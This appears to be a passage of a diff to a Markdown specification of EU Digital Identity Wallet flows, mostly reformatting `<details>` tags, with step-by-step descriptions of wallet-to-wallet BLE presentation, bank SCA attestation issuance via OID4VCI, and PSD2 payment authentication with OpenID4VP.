 The Holder Wallet displays a complementary warning: *"You are about to share your credentials with another person. This person cannot be verified — they have no registered identity. Only share data with people you trust."* Unlike RP flows where the WRPAC provides cryptographic identity assurance, W2W interactions rely entirely on the Holder's out-of-band trust in the Verifier (physical presence, personal relationship).
 
 > **No WRPAC = no RP identity**: The Holder-side warning emphasises that the Verifier cannot be authenticated. In standard RP flows (§9.2, §13.4), the Wallet validates the RP's WRPAC before showing the consent screen. In W2W, no such validation is possible — the Holder must rely on personal judgement.
 
 </details>
-<details><summary><strong>6. Holder User selects the Holder role</strong></summary>
+<details>
+<summary><strong>6. Holder User selects the Holder role</strong></summary>
 
 The Holder User selects the "Holder" role, which prompts the Wallet to enumerate all valid credentials from its secure storage (WSCA boundary). Unlike RP flows where the Verifier's DCQL query determines which credentials are relevant, in W2W the Holder proactively chooses what to offer — this is the **Holder-driven disclosure** model unique to TS9.
 
 </details>
-<details><summary><strong>7. Holder Wallet displays available attestations and attributes</strong></summary>
+<details>
+<summary><strong>7. Holder Wallet displays available attestations and attributes</strong></summary>
 
 The Holder Wallet queries its secure storage and displays a list of all valid credentials and their individual attributes. The Wallet shows each credential type (PID, mDL, QEAA) with expandable attribute lists. Only mdoc-format credentials are eligible (TS9 §1.2) — SD-JWT VC credentials are filtered out of the W2W interface.
 
 > **Offline readiness**: Since W2W operates in proximity (BLE), the Holder's Wallet must be able to enumerate credentials and construct the `PresentationOffer` without internet connectivity. All credential metadata must be locally cached.
 
 </details>
-<details><summary><strong>8. Holder User selects attributes to offer</strong></summary>
+<details>
+<summary><strong>8. Holder User selects attributes to offer</strong></summary>
 
 The Holder User manually selects the specific attributes they are willing to share. This **reverses the standard RP flow**: in RP interactions (§9.2, §13.4), the RP specifies which attributes it needs via a DCQL query or `DeviceRequest`, and the Holder approves. In W2W, the Holder proactively builds an "offer" defining the maximum disclosure boundary — the Verifier can then select a subset (step 12) but cannot request anything outside the offer.
 
 This Holder-first design is a privacy safeguard: it prevents Verifiers from even knowing which credentials the Holder possesses beyond what the Holder chooses to reveal.
 
 </details>
-<details><summary><strong>9. Holder Wallet builds the PresentationOffer CBOR</strong></summary>
+<details>
+<summary><strong>9. Holder Wallet builds the PresentationOffer CBOR</strong></summary>
 
 The Holder Wallet encodes the user's selected attributes into a structured `PresentationOffer` CBOR payload. This acts as a cryptographic manifest of what the Holder is willing to share in this specific session.
 
@@ -9338,7 +9531,8 @@ PresentationOffer = {
 **Artifact Produced:** `PresentationOffer` CBOR Payload
 
 </details>
-<details><summary><strong>10. Holder Wallet generates a DeviceEngagement QR code</strong></summary>
+<details>
+<summary><strong>10. Holder Wallet generates a DeviceEngagement QR code</strong></summary>
 
 The Holder Wallet creates a `DeviceEngagement` payload (ISO 18013-5 §10.1.1.4) extended with the TS9-specific `PresentationOffer` at CBOR key `-1`. The standard engagement fields (ephemeral ECDH public key, BLE UUID) enable the encrypted transport channel, while the `-1` extension advertises the Holder's offered attributes. The complete payload is CBOR-encoded and rendered as a QR code on the Holder's screen.
 
@@ -9349,7 +9543,8 @@ The Verifier scans this QR code (step 11), simultaneously establishing: (a) the 
 **Audit Telemetry:** The Holder Wallet logs a `DEVICE_ENGAGEMENT_QR_RENDERED` event.
 
 </details>
-<details><summary><strong>11. Verifier Wallet displays offered attributes</strong></summary>
+<details>
+<summary><strong>11. Verifier Wallet displays offered attributes</strong></summary>
 
 The Verifier Wallet scans the QR code, decodes the CBOR `DeviceEngagement`, extracts the `PresentationOffer` from key `-1`, and displays the offered attributes on the Verifier's screen. The display shows: credential type (e.g., *"EU Digital Identity — PID"*), and the individual attributes offered (e.g., `family_name`, `given_name`, `birth_date`, `age_over_18`).
 
@@ -9358,7 +9553,8 @@ The Verifier User can now see what the Holder is willing to share — but cannot
 **Audit Telemetry:** The Verifier Wallet logs a `DEVICE_ENGAGEMENT_QR_SCANNED` event.
 
 </details>
-<details><summary><strong>12. Verifier User selects a subset of attributes to request</strong></summary>
+<details>
+<summary><strong>12. Verifier User selects a subset of attributes to request</strong></summary>
 
 The Verifier User selects the specific attributes they need from the offered set. The TS9 protocol enforces a **strict subset constraint** — the Verifier can only request attributes listed in the `PresentationOffer`. The Wallet UI should present the offered attributes as checkboxes with a "Select All" option.
 
@@ -9367,7 +9563,8 @@ For example, if the Holder offered `[family_name, given_name, birth_date, age_ov
 > **PresentationOffer is optional (STS9_12)**: If the Holder did not include a `PresentationOffer` in the `DeviceEngagement`, the Verifier can request any attributes. This fallback enables simpler W2W interactions where the Holder trusts the Verifier to request only what is needed.
 
 </details>
-<details><summary><strong>13. Verifier Wallet transmits the DeviceRequest over BLE</strong></summary>
+<details>
+<summary><strong>13. Verifier Wallet transmits the DeviceRequest over BLE</strong></summary>
 
 The Verifier Wallet establishes the BLE connection and transmits the `DeviceRequest`. Crucially, because the Verifier is an unregistered natural person, there is no `readerAuth` signature (no WRPAC certificate). Additionally, to comply with privacy rules, all `IntentToRetain` flags must be forcibly set to `false`.
 
@@ -9376,7 +9573,7 @@ DeviceRequest = {
   "version": "1.0",
   "docRequests": [
     {
-      "itemsRequest": 24(<<
+      "itemsRequest": 24(&lt;<
         {
           "docType": "eu.europa.ec.eudi.pid.1",
           "nameSpaces": {
@@ -9399,7 +9596,8 @@ DeviceRequest = {
 **Audit Telemetry:** The Verifier Wallet logs an `UNAUTHENTICATED_DEVICE_REQUEST_DISPATCHED` event.
 
 </details>
-<details><summary><strong>14. Holder Wallet validates that the request is a strict subset</strong></summary>
+<details>
+<summary><strong>14. Holder Wallet validates that the request is a strict subset</strong></summary>
 
 The Holder Wallet validates the incoming `DeviceRequest` against the `PresentationOffer` built in step 9. For each `docType` and `nameSpace`, the Wallet checks that every requested element identifier exists in the offer's element list. If the Verifier attempts to request an attribute not included in the `PresentationOffer`, the Wallet immediately terminates the BLE session and displays an error: *"The Verifier requested data outside the agreed scope."*
 
@@ -9410,7 +9608,8 @@ This enforcement is critical because the Verifier has no WRPAC — there is no i
 **Audit Telemetry:** The Holder Wallet logs a `PRESENTATION_OFFER_SUBSET_VALIDATED` event.
 
 </details>
-<details><summary><strong>15. Holder Wallet displays the final consent screen</strong></summary>
+<details>
+<summary><strong>15. Holder Wallet displays the final consent screen</strong></summary>
 
 The Holder Wallet displays a final consent screen showing exactly which attributes the Verifier requested. Unlike RP flows (§9.2 step 13), the consent screen in W2W prominently displays:
 
@@ -9421,7 +9620,8 @@ The Holder Wallet displays a final consent screen showing exactly which attribut
 This double-consent model (first: selecting what to offer in step 8; second: confirming the actual request here) provides layered privacy protection unique to the W2W flow.
 
 </details>
-<details><summary><strong>16. Holder User approves and authenticates</strong></summary>
+<details>
+<summary><strong>16. Holder User approves and authenticates</strong></summary>
 
 The Holder User taps "Approve" and authenticates via biometric (fingerprint / face) or PIN to unlock the WSCA and authorise the DeviceAuth signature (step 17). The authentication flow is identical to §13.4 step 14 — the WSCA releases the credential's device key for a single COSE_Sign1 operation over the `DeviceAuthentication` structure.
 
@@ -9432,7 +9632,8 @@ The Holder User taps "Approve" and authenticates via biometric (fingerprint / fa
 **Artifact Produced:** User Authentication Token / Biometric Match
 
 </details>
-<details><summary><strong>17. Holder Wallet transmits the DeviceResponse over BLE</strong></summary>
+<details>
+<summary><strong>17. Holder Wallet transmits the DeviceResponse over BLE</strong></summary>
 
 The Holder Wallet constructs and encrypts the `DeviceResponse` CBOR structure (identical to §13.4 step 16's format) and transmits it over the BLE channel. The response contains:
 
@@ -9446,7 +9647,8 @@ Per STS9_29, the `IntentToRetain` for all attributes is `false` — the Verifier
 **Audit Telemetry:** The Holder Wallet logs an `ENCRYPTED_DEVICE_RESPONSE_DISPATCHED` event.
 
 </details>
-<details><summary><strong>18. Verifier Wallet verifies IssuerAuth (MSO)</strong></summary>
+<details>
+<summary><strong>18. Verifier Wallet verifies IssuerAuth (MSO)</strong></summary>
 
 The Verifier Wallet performs the same IssuerAuth verification as an RP terminal (§13.4 step 18): extract the MSO from the `issuerAuth` COSE_Sign1, verify the ES256 signature using the PID Provider's certificate, and validate the certificate chain against the LoTE trust anchor. The Verifier Wallet must maintain its own LoTE cache (refreshed when online) to perform this verification.
 
@@ -9459,7 +9661,8 @@ This step ensures the attribute values are genuine — even though the Verifier 
 **Audit Telemetry:** The Verifier Wallet logs an `ISSUER_AUTH_SIGNATURE_VERIFIED` event.
 
 </details>
-<details><summary><strong>19. Verifier Wallet verifies DeviceAuth</strong></summary>
+<details>
+<summary><strong>19. Verifier Wallet verifies DeviceAuth</strong></summary>
 
 The Verifier Wallet verifies the `deviceSignature` COSE_Sign1 over the `DeviceAuthentication` CBOR structure (§13.4 step 20). This proves: (a) the person holding the Holder device possesses the private key that the PID Provider originally bound to the credential, and (b) the presentation is bound to this specific session via the `SessionTranscript`.
 
@@ -9470,7 +9673,8 @@ In W2W, DeviceAuth verification is especially important because there is no visu
 **Audit Telemetry:** The Verifier Wallet logs a `DEVICE_AUTH_SIGNATURE_VERIFIED` event.
 
 </details>
-<details><summary><strong>20. Verifier Wallet verifies PID validity</strong></summary>
+<details>
+<summary><strong>20. Verifier Wallet verifies PID validity</strong></summary>
 
 The Verifier Wallet checks the MSO's `validityInfo` to confirm the PID has not expired (`validFrom` ≤ now ≤ `validUntil`). If the Verifier Wallet has internet connectivity, it can also query the Token Status List to check for revocation — but this is often unavailable in offline W2W scenarios.
 
@@ -9481,7 +9685,8 @@ As discussed in §5.4.2 step 4, PID validity serves as an indirect Wallet Unit h
 **Audit Telemetry:** The Verifier Wallet logs a `PID_VALIDITY_CONFIRMED` event.
 
 </details>
-<details><summary><strong>21. Verifier Wallet displays verified attributes</strong></summary>
+<details>
+<summary><strong>21. Verifier Wallet displays verified attributes</strong></summary>
 
 Upon successful verification (steps 18–20), the Verifier Wallet renders the verified attributes on the Verifier User's screen with verification indicators (✅ *"Verified by [PID Provider name]"*). The display is ephemeral — once the Verifier closes the screen, navigates away, or the session times out, the attribute values are **permanently purged from device memory** (STS9_29).
 
@@ -9649,19 +9854,22 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User opens banking app and selects "Add card to EUDI Wallet"</strong></summary>
+<details>
+<summary><strong>1. User opens banking app and selects "Add card to EUDI Wallet"</strong></summary>
 
 The User navigates to the card management section of their Bank's mobile app and selects an option to provision a payment card into their EUDI Wallet (e.g., *"Add Visa •••4242 to EUDI Wallet"*). This action initiates the OID4VCI Pre-Authorized Code flow. The Bank's app is the trigger — the User does **not** start from the EUDI Wallet side. This ensures the Bank controls the enrolment experience and can apply its own eligibility checks (e.g., card status, account standing) before issuing the SCA attestation.
 
 </details>
-<details><summary><strong>2. Bank authenticates User via existing SCA</strong></summary>
+<details>
+<summary><strong>2. Bank authenticates User via existing SCA</strong></summary>
 
 The Bank re-authenticates the User using its existing SCA mechanisms (PSD2 Art. 97) — typically the banking app's biometric lock or PIN. This is a **re-authentication**, not initial onboarding: the User already has an active banking relationship. The re-authentication proves the User is the legitimate account holder before the Bank issues an SCA attestation. Some banks may require step-up authentication (e.g., SMS OTP in addition to biometric) for high-privilege operations like credential provisioning.
 
 **Audit Telemetry:** The Bank logs an `EXISTING_SCA_USER_AUTHENTICATED` event.
 
 </details>
-<details><summary><strong>3. Bank generates pre-authorized_code and optional tx_code</strong></summary>
+<details>
+<summary><strong>3. Bank generates pre-authorized_code and optional tx_code</strong></summary>
 
 The Bank generates the cryptographic material for the OID4VCI Pre-Authorized Code flow:
 
@@ -9675,7 +9883,8 @@ The Pre-Authorized Code flow is preferred over the standard Authorization Code f
 **Audit Telemetry:** The Bank logs a `PRE_AUTHORIZED_CODE_GENERATED` event.
 
 </details>
-<details><summary><strong>4. Bank transmits Credential Offer to Wallet Unit</strong></summary>
+<details>
+<summary><strong>4. Bank transmits Credential Offer to Wallet Unit</strong></summary>
 
 The Bank transmits a Credential Offer to the Wallet Unit, typically via a same-device deeplink or by displaying a QR code.
 
@@ -9710,7 +9919,8 @@ Key fields:
 **Audit Telemetry:** The Bank logs a `CREDENTIAL_OFFER_DISPATCHED` event.
 
 </details>
-<details><summary><strong>5. Wallet Unit parses Credential Offer and resolves Issuer metadata</strong></summary>
+<details>
+<summary><strong>5. Wallet Unit parses Credential Offer and resolves Issuer metadata</strong></summary>
 
 The Wallet parses the Credential Offer JSON and extracts the `credential_issuer` URL. It then fetches the Bank's OID4VCI Issuer Metadata from `https://pay.example-bank.de/.well-known/openid-credential-issuer` to discover: (a) the Token Endpoint URL, (b) the Credential Endpoint URL, (c) the `credential_configurations_supported` map (which defines the SCA attestation's format, VCT, and available claims), and (d) supported proof types (`jwt` with `ES256`).
 
@@ -9719,7 +9929,8 @@ The Wallet parses the Credential Offer JSON and extracts the `credential_issuer`
 **Audit Telemetry:** The Wallet Unit logs an `ISSUER_METADATA_RESOLVED` event.
 
 </details>
-<details><summary><strong>6. Wallet Unit exchanges pre-authorized_code at Token Endpoint</strong></summary>
+<details>
+<summary><strong>6. Wallet Unit exchanges pre-authorized_code at Token Endpoint</strong></summary>
 
 The Wallet calls the Bank's Token Endpoint to exchange the `pre-authorized_code` (and `tx_code` if required) for an access token.
 
@@ -9738,7 +9949,8 @@ grant_type=urn:ietf:params:oauth:grant-type:pre-authorized_code
 **Audit Telemetry:** The Wallet Unit logs a `TOKEN_ENDPOINT_EXCHANGE_INITIATED` event.
 
 </details>
-<details><summary><strong>7. Bank returns access_token and c_nonce to Wallet Unit</strong></summary>
+<details>
+<summary><strong>7. Bank returns access_token and c_nonce to Wallet Unit</strong></summary>
 
 The Bank validates the codes and responds with an `access_token` and a cryptographic `c_nonce`.
 
@@ -9761,7 +9973,8 @@ The `c_nonce` is critical — the Wallet must include it in the proof-of-possess
 **Audit Telemetry:** The Bank logs an `ACCESS_TOKEN_ISSUED` event.
 
 </details>
-<details><summary><strong>8. Wallet Unit generates EC P-256 device key pair in WSCA/WSCD</strong></summary>
+<details>
+<summary><strong>8. Wallet Unit generates EC P-256 device key pair in WSCA/WSCD</strong></summary>
 
 The Wallet generates a fresh EC P-256 key pair inside the WSCA (Wallet Secure Cryptographic Application) or WSCD (Wallet Secure Cryptographic Device). The private key is hardware-bound — it never leaves the secure element (SE, TEE, or StrongBox). This key becomes the credential's **device key**: the public key is embedded in the credential's `cnf.jwk` (step 11), and the private key signs KB-JWTs during future presentations (§15.8). The key is specific to *this* SCA attestation — each credential gets its own key pair.
 
@@ -9770,7 +9983,8 @@ The Wallet generates a fresh EC P-256 key pair inside the WSCA (Wallet Secure Cr
 **Audit Telemetry:** The Wallet Unit logs a `DEVICE_KEY_PAIR_GENERATED` event.
 
 </details>
-<details><summary><strong>9. Wallet Unit builds proof-of-possession JWT with c_nonce</strong></summary>
+<details>
+<summary><strong>9. Wallet Unit builds proof-of-possession JWT with c_nonce</strong></summary>
 
 The Wallet constructs a proof-of-possession JWT (`typ: openid4vci-proof+jwt`) signed with the newly generated device private key (step 8). The JWT includes: (a) the Bank's `c_nonce` in the `nonce` payload claim (binding this proof to the current issuance session), (b) the device public key in the `jwk` header parameter (so the Bank can extract it), (c) `aud` set to the Bank's Credential Issuer URL, and (d) `iat` set to the current time. This proof demonstrates that the Wallet actually possesses the private key corresponding to the public key it is asking the Bank to embed in the credential.
 
@@ -9779,7 +9993,8 @@ The Wallet constructs a proof-of-possession JWT (`typ: openid4vci-proof+jwt`) si
 **Audit Telemetry:** The Wallet Unit logs a `POP_JWT_GENERATED` event.
 
 </details>
-<details><summary><strong>10. Wallet Unit transmits credential request to Bank Credential Endpoint</strong></summary>
+<details>
+<summary><strong>10. Wallet Unit transmits credential request to Bank Credential Endpoint</strong></summary>
 
 The Wallet calls the Bank's Credential Endpoint, presenting the `access_token`, requesting the specific VCT format, and supplying the proof-of-possession JWT.
 
@@ -9832,7 +10047,8 @@ The `jwk` in the proof JWT header is the Wallet's device public key. The Bank wi
 **Audit Telemetry:** The Wallet Unit logs a `CREDENTIAL_REQUEST_DISPATCHED` event.
 
 </details>
-<details><summary><strong>11. Bank creates SD-JWT VC with SCA claims and device key binding</strong></summary>
+<details>
+<summary><strong>11. Bank creates SD-JWT VC with SCA claims and device key binding</strong></summary>
 
 The Bank verifies the proof-of-possession, extracts the `jwk` from the proof header, and creates the SCA Attestation (SD-JWT VC). The Bank's Attestation Provider signs the credential, embedding the public key into the `cnf` (confirmation) claim.
 
@@ -9877,13 +10093,14 @@ The `cnf.jwk` matches the device public key from the proof JWT. When this SCA at
 **Audit Telemetry:** The Bank logs an `SD_JWT_VC_CREATED` event.
 
 </details>
-<details><summary><strong>12. Bank delivers SD-JWT VC response to Wallet Unit</strong></summary>
+<details>
+<summary><strong>12. Bank delivers SD-JWT VC response to Wallet Unit</strong></summary>
 
 The Bank responds to the Credential Endpoint request with the fully signed SD-JWT VC. The response format:
 
 ```json
 {
-  "credential": "<Issuer-JWT>~<Disclosure:pan_last_four>~<Disclosure:scheme>~<Disclosure:card_holder_name>~",
+  "credential": "&lt;Issuer-JWT>~&lt;Disclosure:pan_last_four>~&lt;Disclosure:scheme>~&lt;Disclosure:card_holder_name>~",
   "c_nonce": "new_nonce_for_refresh",
   "c_nonce_expires_in": 300
 }
@@ -9896,14 +10113,16 @@ The `credential` field contains the SD-JWT VC string (Issuer-JWT + disclosures, 
 **Audit Telemetry:** The Bank logs an `SD_JWT_VC_RESPONSE_DISPATCHED` event.
 
 </details>
-<details><summary><strong>13. Wallet Unit stores SCA attestation securely</strong></summary>
+<details>
+<summary><strong>13. Wallet Unit stores SCA attestation securely</strong></summary>
 
 The Wallet stores the SCA attestation's SD-JWT VC in its credential store, associated with the WSCA-bound device private key (step 8). The storage links: (a) the Issuer-JWT + disclosures (the credential itself), (b) a reference to the hardware-bound private key (for KB-JWT signing during presentations), (c) the credential metadata (issuer, VCT, expiry), and (d) display information (card scheme logo, last four digits). The credential is now ready for use in SCA flows (§15.8).
 
 **Audit Telemetry:** The Wallet Unit logs an `SCA_ATTESTATION_STORED` event.
 
 </details>
-<details><summary><strong>14. Wallet Unit confirms "Card added to Wallet" to User</strong></summary>
+<details>
+<summary><strong>14. Wallet Unit confirms "Card added to Wallet" to User</strong></summary>
 
 The Wallet displays a success confirmation to the User — e.g., *"✅ Visa •••4242 has been added to your EUDI Wallet"* with the card scheme logo. The SCA attestation appears in the Wallet's credential list alongside the User's PID and other attestations. From this point, the User can authorise payments using the EUDI Wallet (§15.8) instead of the Bank's dedicated mobile app, enabling cross-PSP SCA portability.
 
@@ -10120,21 +10339,24 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User initiates payment at Merchant</strong></summary>
+<details>
+<summary><strong>1. User initiates payment at Merchant</strong></summary>
 
 The User initiates an electronic payment on the Merchant's website or mobile app (e.g., clicking "Pay now" at checkout for a €49.99 online purchase). The Merchant's payment page collects the User's card information (or a tokenised reference from a previous session) and submits it to the payment processing pipeline. The User may not yet be aware that EUDI Wallet SCA will be triggered — this depends on the PSP's risk assessment (step 3).
 
-> **SCA trigger context**: PSD2 Art. 97 mandates SCA for electronic payments above certain thresholds, first-time transactions, or when the PSP's Transaction Risk Analysis (TRA) flags the transaction. Low-value payments (< €30, cumulative < €100) may be exempted per RTS Art. 18.
+> **SCA trigger context**: PSD2 Art. 97 mandates SCA for electronic payments above certain thresholds, first-time transactions, or when the PSP's Transaction Risk Analysis (TRA) flags the transaction. Low-value payments (&lt; €30, cumulative &lt; €100) may be exempted per RTS Art. 18.
 
 </details>
-<details><summary><strong>2. Merchant forwards authorization request to Issuer PSP</strong></summary>
+<details>
+<summary><strong>2. Merchant forwards authorization request to Issuer PSP</strong></summary>
 
 The Merchant's payment backend forwards the authorization request to the User's Issuer PSP (the bank that issued the User's payment card or account) via the card scheme network (Visa, Mastercard) or through an acquirer. The authorization message follows standard EMV 3-D Secure (3DS) or scheme-specific protocols. At this stage, the Merchant's role in the SCA flow is complete — all subsequent SCA steps happen between the PSP and the User's Wallet.
 
 > **PSP as RP**: In the SCA flow, the Issuer PSP acts as the Relying Party — it is the entity that sends the OpenID4VP request and verifies the response. The Merchant never sees the SCA attestation or the KB-JWT; it only receives the final authorization approval/decline.
 
 </details>
-<details><summary><strong>3. Issuer PSP determines SCA is required</strong></summary>
+<details>
+<summary><strong>3. Issuer PSP determines SCA is required</strong></summary>
 
 The PSP's risk engine evaluates the transaction against PSD2/PSR regulatory triggers to determine whether SCA is legally required. The evaluation considers:
 
@@ -10146,7 +10368,8 @@ The PSP's risk engine evaluates the transaction against PSD2/PSR regulatory trig
 If SCA is required, the PSP proceeds to build the OpenID4VP request (step 4). If exempt, the PSP approves directly without involving the Wallet.
 
 </details>
-<details><summary><strong>4. Issuer PSP builds OpenID4VP presentation request with transaction_data</strong></summary>
+<details>
+<summary><strong>4. Issuer PSP builds OpenID4VP presentation request with transaction_data</strong></summary>
 
 The PSP constructs the OpenID4VP authorization request with a DCQL query targeting the User's SCA Attestation, explicitly binding the transaction data to the request.
 
@@ -10198,7 +10421,8 @@ The PSP constructs the OpenID4VP authorization request with a DCQL query targeti
 **Artifact Produced:** OpenID4VP Presentation Request (JSON)
 
 </details>
-<details><summary><strong>5. Issuer PSP sends OpenID4VP request (JAR) to Wallet Unit</strong></summary>
+<details>
+<summary><strong>5. Issuer PSP sends OpenID4VP request (JAR) to Wallet Unit</strong></summary>
 
 The PSP signs the OpenID4VP request as a JAR JWS using its WRPAC private key and delivers it to the User's Wallet Unit. The delivery mechanism depends on the flow type:
 
@@ -10213,7 +10437,8 @@ The PSP's role in the EUDI ecosystem is identical to any other RP — it holds a
 **Audit Telemetry:** The Issuer PSP logs an `OPENID4VP_REQUEST_DISPATCHED` event.
 
 </details>
-<details><summary><strong>6. Wallet Unit verifies PSP WRPAC certificate chain</strong></summary>
+<details>
+<summary><strong>6. Wallet Unit verifies PSP WRPAC certificate chain</strong></summary>
 
 The Wallet verifies the PSP's WRPAC certificate chain against the Access CA LoTE trust anchor, identical to §9.2 steps 8–10. The Wallet validates: (a) the JAR JWS signature using the WRPAC's public key, (b) the certificate chain up to the LoTE root, (c) the WRPAC's revocation status via OCSP/CRL, and (d) that the `client_id` in the JAR matches the WRPAC's SAN.
 
@@ -10224,7 +10449,8 @@ For SCA flows, the WRPAC identifies the PSP as a financial institution (e.g., *"
 **Audit Telemetry:** The Wallet Unit logs a `WRPAC_CHAIN_VALIDATED` event.
 
 </details>
-<details><summary><strong>7. Wallet Unit validates SCA attestation type via VCT metadata</strong></summary>
+<details>
+<summary><strong>7. Wallet Unit validates SCA attestation type via VCT metadata</strong></summary>
 
 The Wallet resolves the requested credential's VCT metadata to confirm it qualifies for SCA.
 
@@ -10257,7 +10483,8 @@ The Wallet verifies that `category` is `urn:eu:europa:ec:eudi:sua:sca`, confirmi
 **Audit Telemetry:** The Wallet Unit logs an `SCA_ATTESTATION_TYPE_VALIDATED` event.
 
 </details>
-<details><summary><strong>8. Wallet Unit validates transaction_data type</strong></summary>
+<details>
+<summary><strong>8. Wallet Unit validates transaction_data type</strong></summary>
 
 The Wallet checks that the `type` field in the `transaction_data` array (`urn:eudi:sca:payment:1`) exists in the credential's VCT metadata `transaction_data_types` map (step 7). This prevents the PSP from attaching an unsupported transaction type to the request — e.g., a payment PSP cannot send a `urn:eudi:sca:account_access:1` transaction type if the SCA attestation's VCT metadata only lists payment types.
 
@@ -10266,7 +10493,8 @@ The Wallet checks that the `type` field in the `transaction_data` array (`urn:eu
 **Audit Telemetry:** The Wallet Unit logs a `TRANSACTION_DATA_TYPE_VALIDATED` event.
 
 </details>
-<details><summary><strong>9. Wallet Unit validates transaction payload against JSON Schema</strong></summary>
+<details>
+<summary><strong>9. Wallet Unit validates transaction payload against JSON Schema</strong></summary>
 
 The Wallet validates the `transaction_data[0].payload` JSON object against the authoritative JSON Schema linked in the VCT metadata (`schema_uri`). The Schema defines: required fields (`amount`, `currency`, `payee.name`), field types (number, string, ISO 4217 currency codes), and constraints (e.g., `amount > 0`). This validation ensures the PSP provided structurally valid transaction data — not arbitrary or malformed JSON that could confuse the consent screen rendering (step 10).
 
@@ -10275,7 +10503,8 @@ The Wallet validates the `transaction_data[0].payload` JSON object against the a
 **Audit Telemetry:** The Wallet Unit logs a `TRANSACTION_PAYLOAD_SCHEMA_VALIDATED` event.
 
 </details>
-<details><summary><strong>10. Wallet Unit renders consent screen with transaction details</strong></summary>
+<details>
+<summary><strong>10. Wallet Unit renders consent screen with transaction details</strong></summary>
 
 The Wallet dynamically renders the consent screen layout according to the TS12 display hierarchy.
 
@@ -10288,7 +10517,8 @@ The Wallet dynamically renders the consent screen layout according to the TS12 d
 | **Button** | "Zahlung bestätigen" | From `ui_labels.affirmative_action_label` (de) |
 
 </details>
-<details><summary><strong>11. User approves payment via biometric or PIN</strong></summary>
+<details>
+<summary><strong>11. User approves payment via biometric or PIN</strong></summary>
 
 The User reviews the transaction details (amount, payee, IBAN) on the consent screen and taps *"Zahlung bestätigen"* (Confirm Payment) — the localised affirmative action label from the VCT metadata. The Wallet then requires biometric or PIN authentication to unlock the WSCA and authorise the KB-JWT signature.
 
@@ -10306,7 +10536,8 @@ The `amr` array in the KB-JWT (step 12) documents which factors were applied, en
 **Audit Telemetry:** The Wallet Unit logs a `USER_PAYMENT_APPROVED` event.
 
 </details>
-<details><summary><strong>12. Wallet Unit builds KB-JWT with SCA proof and transaction hash</strong></summary>
+<details>
+<summary><strong>12. Wallet Unit builds KB-JWT with SCA proof and transaction hash</strong></summary>
 
 The Wallet builds the Key Binding JWT, which inherently acts as the requested SCA proof by dynamically linking the transaction details to the cryptographic signature.
 
@@ -10350,7 +10581,8 @@ Key claims explained:
 **Audit Telemetry:** The Wallet Unit logs a `KB_JWT_SCA_PROOF_GENERATED` event.
 
 </details>
-<details><summary><strong>13. Wallet Unit transmits encrypted JWE response to PSP</strong></summary>
+<details>
+<summary><strong>13. Wallet Unit transmits encrypted JWE response to PSP</strong></summary>
 
 The Wallet encrypts the complete presentation response (SD-JWT VC with disclosed claims, KB-JWT with SCA proof) into a JWE using the PSP's ephemeral ECDH-ES public key (from the JAR's `response_encryption_jwk`), identical to §9.2 step 17. The JWE is POSTed to the PSP's `response_uri` (`https://psp.example-bank.de/sca/callback`).
 
@@ -10361,7 +10593,8 @@ The encrypted payload contains the `vp_token` (the SD-JWT VC string with KB-JWT 
 **Audit Telemetry:** The Wallet Unit logs an `ENCRYPTED_JWE_RESPONSE_DISPATCHED` event.
 
 </details>
-<details><summary><strong>14. Issuer PSP verifies SCA attestation signature</strong></summary>
+<details>
+<summary><strong>14. Issuer PSP verifies SCA attestation signature</strong></summary>
 
 The PSP decrypts the JWE (using its ephemeral private key, then immediately destroys it for forward secrecy) and parses the SD-JWT VC string. The PSP verifies the Issuer-JWT signature to confirm the SCA attestation was legitimately issued. Since the PSP is itself the issuer of the SCA attestation, it can verify the signature using its own public key — no LoTE lookup is needed.
 
@@ -10372,7 +10605,8 @@ The PSP also verifies the disclosed claims from the SD-JWT disclosures: `user_id
 **Audit Telemetry:** The Issuer PSP logs an `SCA_ATTESTATION_SIGNATURE_VERIFIED` event.
 
 </details>
-<details><summary><strong>15. Issuer PSP verifies KB-JWT signature and SCA factors</strong></summary>
+<details>
+<summary><strong>15. Issuer PSP verifies KB-JWT signature and SCA factors</strong></summary>
 
 The PSP verifies the KB-JWT (the SCA proof) against the `cnf.jwk` public key bound in the SCA attestation's Issuer-JWT. The verification checks:
 
@@ -10388,7 +10622,8 @@ The PSP verifies the KB-JWT (the SCA proof) against the `cnf.jwk` public key bou
 **Audit Telemetry:** The Issuer PSP logs a `KB_JWT_SIGNATURE_VERIFIED` event.
 
 </details>
-<details><summary><strong>16. Issuer PSP verifies dynamic linking (transaction hash match)</strong></summary>
+<details>
+<summary><strong>16. Issuer PSP verifies dynamic linking (transaction hash match)</strong></summary>
 
 The PSP performs the PSD2 dynamic linking verification — the critical step that binds the User's authentication to the specific transaction. The PSP recalculates `SHA-256(base64url(transaction_data[0].payload))` from its own copy of the original `transaction_data` payload (step 4) and compares the digest against `transaction_data_hashes[0]` in the KB-JWT.
 
@@ -10399,7 +10634,8 @@ If the hashes match, it proves irrefutably that: (a) the User saw and approved t
 **Audit Telemetry:** The Issuer PSP logs a `DYNAMIC_LINKING_HASH_VERIFIED` event.
 
 </details>
-<details><summary><strong>17. Issuer PSP approves financial authorization</strong></summary>
+<details>
+<summary><strong>17. Issuer PSP approves financial authorization</strong></summary>
 
 With all SCA verification steps passed (attestation signature ✅, KB-JWT signature ✅, SCA factors ≥ 2 ✅, dynamic linking hash match ✅), the PSP approves the financial authorisation. The PSP sends an approval response back to the card scheme network (Visa/Mastercard) or directly to the Merchant's acquirer. The PSP logs the complete SCA evidence trail for regulatory audit: `jti` (authentication code), `amr` (factors used), `transaction_data_hashes` (linked transaction), and the verification timestamp.
 
@@ -10410,7 +10646,8 @@ With all SCA verification steps passed (attestation signature ✅, KB-JWT signat
 **Audit Telemetry:** The Issuer PSP logs a `FINANCIAL_AUTHORIZATION_APPROVED` event.
 
 </details>
-<details><summary><strong>18. Merchant confirms payment to User</strong></summary>
+<details>
+<summary><strong>18. Merchant confirms payment to User</strong></summary>
 
 The Merchant receives the authorisation approval from the PSP (via the card scheme or acquirer) and updates the checkout session. The User sees a payment confirmation screen (e.g., *"Payment successful — your order has been placed"*) in their browser or app. The Merchant never sees the SCA attestation, KB-JWT, or any Wallet-level details — it only receives a standard payment authorisation code.
 
@@ -10779,10 +11016,10 @@ The Wallet Unit (Authenticator) responds with a `PublicKeyCredential` containing
 {
   "id": "dGVzdC1jcmVkZW50aWFsLWlk",
   "type": "public-key",
-  "rawId": "<ArrayBuffer: credential ID>",
+  "rawId": "&lt;ArrayBuffer: credential ID>",
   "response": {
-    "clientDataJSON": "<ArrayBuffer: {type, challenge, origin, crossOrigin}>",
